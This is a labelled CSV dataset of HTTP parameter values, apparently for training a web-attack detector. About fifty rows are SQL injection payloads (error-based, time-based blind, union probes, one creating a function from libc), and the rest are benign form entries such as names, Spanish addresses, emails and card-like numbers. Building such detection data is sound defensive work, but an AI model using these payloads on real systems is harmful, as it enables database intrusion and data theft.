payload,label,source_dataset,source_label,source_binary_label,length,split_hint,is_external,is_wordlist,use_for_training
"1)) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((5349=5349",SQL_Injection,HttpParamsDataset,sqli,anom,190,train,True,False,True
"1') and 8407=(select count(*) from generate_series(1,5000000))",SQL_Injection,HttpParamsDataset,sqli,anom,62,train,True,False,True
"1);select count(*) from generate_series(1,5000000)--",SQL_Injection,HttpParamsDataset,sqli,anom,52,train,True,False,True
"1'+(select jley where 3581=3581 and 2388=benchmark(5000000,md5(0x6d457153))#",SQL_Injection,HttpParamsDataset,sqli,anom,76,train,True,False,True
1') rlike (select * from (select(sleep(5)))sgvo) and ('lzbn'='lzbn,SQL_Injection,HttpParamsDataset,sqli,anom,66,train,True,False,True
"-5817' in boolean mode) union all select 2391,2391,2391,2391,2391--",SQL_Injection,HttpParamsDataset,sqli,anom,67,train,True,False,True
"1%""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SQL_Injection,HttpParamsDataset,sqli,anom,144,train,True,False,True
"1%""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",SQL_Injection,HttpParamsDataset,sqli,anom,159,train,True,False,True
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",SQL_Injection,HttpParamsDataset,sqli,anom,172,train,True,False,True
"1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",SQL_Injection,HttpParamsDataset,sqli,anom,96,train,True,False,True
1%') and (select * from (select(sleep(5)))gcrr)#,SQL_Injection,HttpParamsDataset,sqli,anom,48,train,True,False,True
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and 'hvqt'='hvqt",SQL_Injection,HttpParamsDataset,sqli,anom,101,train,True,False,True
1') or 6793=(select 6793 from pg_sleep(5)) and ('fuvv'='fuvv,SQL_Injection,HttpParamsDataset,sqli,anom,60,train,True,False,True
"1""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""kcxw""=""kcxw",SQL_Injection,HttpParamsDataset,sqli,anom,228,train,True,False,True
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('tnfm' like 'tnfm",SQL_Injection,HttpParamsDataset,sqli,anom,131,train,True,False,True
1');select pg_sleep(5),SQL_Injection,HttpParamsDataset,sqli,anom,22,train,True,False,True
"1"" where 8089=8089;iif(5257=5257,1,1/0)",SQL_Injection,HttpParamsDataset,sqli,anom,39,train,True,False,True
"1%"") and 4595=4595#",SQL_Injection,HttpParamsDataset,sqli,anom,19,train,True,False,True
"-3769""))) union all select 8456#",SQL_Injection,HttpParamsDataset,sqli,anom,32,train,True,False,True
"1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",SQL_Injection,HttpParamsDataset,sqli,anom,84,train,True,False,True
"1%') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('%'='",SQL_Injection,HttpParamsDataset,sqli,anom,116,train,True,False,True
1%'));if(7899=7899) select 7899 else drop function zbbp--,SQL_Injection,HttpParamsDataset,sqli,anom,57,train,True,False,True
"1')));select count(*) from generate_series(1,5000000)--",SQL_Injection,HttpParamsDataset,sqli,anom,55,train,True,False,True
"1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",SQL_Injection,HttpParamsDataset,sqli,anom,80,train,True,False,True
"1""))) and 7135=8805#",SQL_Injection,HttpParamsDataset,sqli,anom,20,train,True,False,True
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""ureu"" like ""ureu",SQL_Injection,HttpParamsDataset,sqli,anom,128,train,True,False,True
"1%';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'='",SQL_Injection,HttpParamsDataset,sqli,anom,99,train,True,False,True
"1%') union all select null,null,null,null,null#",SQL_Injection,HttpParamsDataset,sqli,anom,47,train,True,False,True
"1%'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",SQL_Injection,HttpParamsDataset,sqli,anom,90,train,True,False,True
1')) as vnwn where 8774=8774 and (select * from (select(sleep(5)))gcrr)#,SQL_Injection,HttpParamsDataset,sqli,anom,72,train,True,False,True
"1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SQL_Injection,HttpParamsDataset,sqli,anom,150,train,True,False,True
1') rlike (select (case when (2671=4485) then 1 else 0x28 end)) and ('ezco' like 'ezco,SQL_Injection,HttpParamsDataset,sqli,anom,86,train,True,False,True
"-9023%""))) union all select 4490,4490,4490#",SQL_Injection,HttpParamsDataset,sqli,anom,43,train,True,False,True
"1) as attr where 8085=8085 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",SQL_Injection,HttpParamsDataset,sqli,anom,134,train,True,False,True
"1"" where 7022=7022;select (case when (7822=4430) then 7822 else 1/(select 0) end)--",SQL_Injection,HttpParamsDataset,sqli,anom,83,train,True,False,True
(select (case when (7018=7018) then 7018 else 7018*(select 7018 from master..sysdatabases) end)),SQL_Injection,HttpParamsDataset,sqli,anom,96,train,True,False,True
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)-- xsob",SQL_Injection,HttpParamsDataset,sqli,anom,112,train,True,False,True
"1')) as uuuk where 7234=7234 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",SQL_Injection,HttpParamsDataset,sqli,anom,105,train,True,False,True
"1')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SQL_Injection,HttpParamsDataset,sqli,anom,145,train,True,False,True
"1'))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SQL_Injection,HttpParamsDataset,sqli,anom,143,train,True,False,True
"1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",SQL_Injection,HttpParamsDataset,sqli,anom,155,train,True,False,True
"1' in boolean mode) union all select null,null,null,null,null,null,null--",SQL_Injection,HttpParamsDataset,sqli,anom,73,train,True,False,True
"1%"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""%""=""",SQL_Injection,HttpParamsDataset,sqli,anom,81,train,True,False,True
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('ccqs'='ccqs",SQL_Injection,HttpParamsDataset,sqli,anom,114,train,True,False,True
"1%"")));begin user_lock.sleep(5); end and (((""%""=""",SQL_Injection,HttpParamsDataset,sqli,anom,49,train,True,False,True
"-1171' union all select 3958,3958,3958,3958,3958--",SQL_Injection,HttpParamsDataset,sqli,anom,50,train,True,False,True
1 and 7533=7533# absp,SQL_Injection,HttpParamsDataset,sqli,anom,21,train,True,False,True
"1%' and elt(3114=3114,sleep(5))#",SQL_Injection,HttpParamsDataset,sqli,anom,32,train,True,False,True
"1%"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""",SQL_Injection,HttpParamsDataset,sqli,anom,212,train,True,False,True
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",SQL_Injection,HttpParamsDataset,sqli,anom,70,train,True,False,True
"-3667%')) union all select 3560,3560,3560--",SQL_Injection,HttpParamsDataset,sqli,anom,43,train,True,False,True
"1%"" and (2850=6610)*6610 and ""%""=""",SQL_Injection,HttpParamsDataset,sqli,anom,34,train,True,False,True
3,Normal,HttpParamsDataset,norm,norm,1,train,True,False,True
100,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
55,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
entrar,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
choong,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
off,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
2,Normal,HttpParamsDataset,norm,norm,1,train,True,False,True
insertar,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
2672,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
registro,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
cen,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
nurit,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
ferrandez cabaas,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
17621392b,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
calle clavel 30 11?b,Normal,HttpParamsDataset,norm,norm,20,train,True,False,True
17463,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
cceres,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
registrar,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
vaciar carrito,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
rodern,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
franklin,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
pockaj-bushman@lecriture.md,Normal,HttpParamsDataset,norm,norm,27,train,True,False,True
29283698y,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
tirapu,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
25320,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
4789967077221120,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
queso manchego,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
1an0re5354,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
1,Normal,HttpParamsDataset,norm,norm,1,train,True,False,True
francois,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
patay,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
rofes,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
brando@elsentidodelavida.lc,Normal,HttpParamsDataset,norm,norm,27,train,True,False,True
hoyo higueron 32 3-f,Normal,HttpParamsDataset,norm,norm,20,train,True,False,True
herrera,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
sevilla,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
6691710338743371,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
prestamente,Normal,HttpParamsDataset,norm,norm,11,train,True,False,True
daciano,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
mayworth@sms24h.tr,Normal,HttpParamsDataset,norm,norm,18,train,True,False,True
83835081n,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
sencelles,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
16842,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
6343513594517926,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
39,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
quinn,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
incisivo,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
del,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
repulsivo,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
amayuela romay,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
bjelic@tradedeficit.dd,Normal,HttpParamsDataset,norm,norm,22,train,True,False,True
"c/ gregal 56, 12?g",Normal,HttpParamsDataset,norm,norm,18,train,True,False,True
anguciana,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
zamora,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
8927148583279843,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
protoalbitar,Normal,HttpParamsDataset,norm,norm,12,train,True,False,True
fabiela,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
wilde@casasdefamosos.zw,Normal,HttpParamsDataset,norm,norm,23,train,True,False,True
25793872q,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
ademuz,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
27654,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
2657051536857190,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
25,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
innota,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
on,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
confirmar,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
verde,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
jamil,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
menndez coyoma,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
99745017c,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"paseo francisco mir berlanga 141, 12-e",Normal,HttpParamsDataset,norm,norm,38,train,True,False,True
40352,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
vila,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
nathalia,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
97llami+ento,Normal,HttpParamsDataset,norm,norm,12,train,True,False,True
salavedra castelltort,Normal,HttpParamsDataset,norm,norm,21,train,True,False,True
soldani-godet@informex.ru,Normal,HttpParamsDataset,norm,norm,25,train,True,False,True
c/ marroquina 16 10?c,Normal,HttpParamsDataset,norm,norm,21,train,True,False,True
villamuelas,Normal,HttpParamsDataset,norm,norm,11,train,True,False,True
a corua,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
6107572427974464,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
85,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
19,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
d9s1a1i89,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
620,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
01r1f9co,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
natalio,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
piesa-diestel@hacia.tz,Normal,HttpParamsDataset,norm,norm,22,train,True,False,True
22011041h,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
novallas,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
47649,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
3618056132500846,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
hanzlice,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
thayra,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
guardiola puertolas,Normal,HttpParamsDataset,norm,norm,19,train,True,False,True
32493489d,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"c/ portal de zamudio 65,",Normal,HttpParamsDataset,norm,norm,24,train,True,False,True
37120,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
5385467629611173,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
pue-gilc,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
coacu_9ado,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
hoyt,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
tope4a5o,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
lehmann cruanas,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
maria-terzon@lingotes.com.org,Normal,HttpParamsDataset,norm,norm,29,train,True,False,True
calle torreta 126 9c,Normal,HttpParamsDataset,norm,norm,20,train,True,False,True
sukarrieta,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
9598787825284298,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
jaki,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
estanislao,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
clara,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
30591115b,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
padre lojendio 53 11?c,Normal,HttpParamsDataset,norm,norm,22,train,True,False,True
40171,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
7693499164739124,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
milly7,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
4ip7237o8h2dira,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
hwei-lin,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
de1l2nda9ur4,Normal,HttpParamsDataset,norm,norm,12,train,True,False,True
montsech peleij,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
arksikainen_simor@paremoselalzheimer.vi,Normal,HttpParamsDataset,norm,norm,39,train,True,False,True
"calle reina violante, 35,",Normal,HttpParamsDataset,norm,norm,25,train,True,False,True
henche,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
segovia,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
3909891121634471,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
e7ato,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
josefa,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
mcginnis-dellagnese@storagecraft.na,Normal,HttpParamsDataset,norm,norm,35,train,True,False,True
21444030a,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
algemes,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
47162,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
neusy,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
post3rior1e.nte,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
crabe,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
largar,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
pellizza echevarra,Normal,HttpParamsDataset,norm,norm,18,train,True,False,True
ehrlich.selwyne@ebaz.ba,Normal,HttpParamsDataset,norm,norm,23,train,True,False,True
"torre-pacheco 35,",Normal,HttpParamsDataset,norm,norm,17,train,True,False,True
clariana de cardener,Normal,HttpParamsDataset,norm,norm,20,train,True,False,True
ourense,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
4485457754707106,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
g53on3a9u56,Normal,HttpParamsDataset,norm,norm,11,train,True,False,True
efran,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
sripatimakul@forohh.ic,Normal,HttpParamsDataset,norm,norm,22,train,True,False,True
08968667r,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
argujillo,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
39450,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
7202990502846857,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
77,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
cukera,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
9173,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
huyente,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
nao,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
wailing@mariposasentudia.je,Normal,HttpParamsDataset,norm,norm,27,train,True,False,True
52218392c,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
vencilln,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
31439,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
9129793967568864,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
faraday,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
xixia,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
paula pladellorens,Normal,HttpParamsDataset,norm,norm,18,train,True,False,True
85744372g,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
santa barbara 28,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
22232,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
lugo,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
79,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
lapchak9,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
318,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
bienia,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
gianina,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
burgs campa,Normal,HttpParamsDataset,norm,norm,11,train,True,False,True
84443986s,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"manuel de falla 119,",Normal,HttpParamsDataset,norm,norm,20,train,True,False,True
33987,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
zaragoza,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
maurie,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
0strop5je0,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
fisas,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
marlaud_losee5@redesmilitantes.tf,Normal,HttpParamsDataset,norm,norm,33,train,True,False,True
viseu 81 8?c,Normal,HttpParamsDataset,norm,norm,12,train,True,False,True
corbera d'ebre,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
murcia,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
4713791605534130,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
conroy7,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
nordes!tal,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
clooney,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
0er_rugneo,Normal,HttpParamsDataset,norm,norm,10,train,True,False,True
ruano barril,Normal,HttpParamsDataset,norm,norm,12,train,True,False,True
loktev@theroxyblue.aero,Normal,HttpParamsDataset,norm,norm,23,train,True,False,True
plza. taboada chivite 32 5?b,Normal,HttpParamsDataset,norm,norm,28,train,True,False,True
aguilar de cods,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
1937545396216025,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
jarel,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
eneas,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
ros rius,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
62257757t,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"c/ espigo, 0 10h",Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
37788,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
4141615236089952,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
marshaus,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
regir,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
guerette,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
2ilat9r7a,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
sorts bransuel,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
sayle@miemail.com.ic,Normal,HttpParamsDataset,norm,norm,20,train,True,False,True
"calle lirios, 51, 3?a",Normal,HttpParamsDataset,norm,norm,21,train,True,False,True
chelva,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
9131603493426395,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
tranfagl,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
jeft,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
larreynaga arce,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
68318279e,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
plza. padre juan de mariana 152,Normal,HttpParamsDataset,norm,norm,31,train,True,False,True
16269,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
tarragona,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
45,Normal,HttpParamsDataset,norm,norm,2,train,True,False,True
royce,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
7173,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
dziawa,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
tromen,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
pecelln,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
42836631m,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"calle colon de larreategui 48,",Normal,HttpParamsDataset,norm,norm,30,train,True,False,True
36683,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
salamanca,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
wenzel,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
borrica,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
moretti alegre,Normal,HttpParamsDataset,norm,norm,14,train,True,False,True
terry@mtos.ar,Normal,HttpParamsDataset,norm,norm,13,train,True,False,True
"rua bamio, 190 11?h",Normal,HttpParamsDataset,norm,norm,19,train,True,False,True
pelarrodrguez,Normal,HttpParamsDataset,norm,norm,13,train,True,False,True
lleida,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
0947549871262969,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
ayunque,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
9006,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
8ho0l2,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
torcuarto,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
maksimovic@gafasdesol.nom.gl,Normal,HttpParamsDataset,norm,norm,28,train,True,False,True
48748000y,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
cualedro,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
31153,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
9528500439395561,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
ketchum,Normal,HttpParamsDataset,norm,norm,7,train,True,False,True
denice,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
abell lamarca,Normal,HttpParamsDataset,norm,norm,13,train,True,False,True
90127318r,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"avinguda francesc macia., 30 3?b",Normal,HttpParamsDataset,norm,norm,32,train,True,False,True
15553,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
cuenca,Normal,HttpParamsDataset,norm,norm,6,train,True,False,True
5,Normal,HttpParamsDataset,norm,norm,1,train,True,False,True
ersil,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
8019,Normal,HttpParamsDataset,norm,norm,4,train,True,False,True
aldhizer,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
ana,Normal,HttpParamsDataset,norm,norm,3,train,True,False,True
rabanal morante,Normal,HttpParamsDataset,norm,norm,15,train,True,False,True
63947168s,Normal,HttpParamsDataset,norm,norm,9,train,True,False,True
"pl. pescaderia, 158, 7-a",Normal,HttpParamsDataset,norm,norm,24,train,True,False,True
50316,Normal,HttpParamsDataset,norm,norm,5,train,True,False,True
albacete,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
threader,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
descolocado,Normal,HttpParamsDataset,norm,norm,11,train,True,False,True
moreno undurraga,Normal,HttpParamsDataset,norm,norm,16,train,True,False,True
stevenin@ceramicasmio.mn,Normal,HttpParamsDataset,norm,norm,24,train,True,False,True
"c/ vapor, 148, 2?a",Normal,HttpParamsDataset,norm,norm,18,train,True,False,True
"espluga calba, l'",Normal,HttpParamsDataset,norm,norm,17,train,True,False,True
palencia,Normal,HttpParamsDataset,norm,norm,8,train,True,False,True
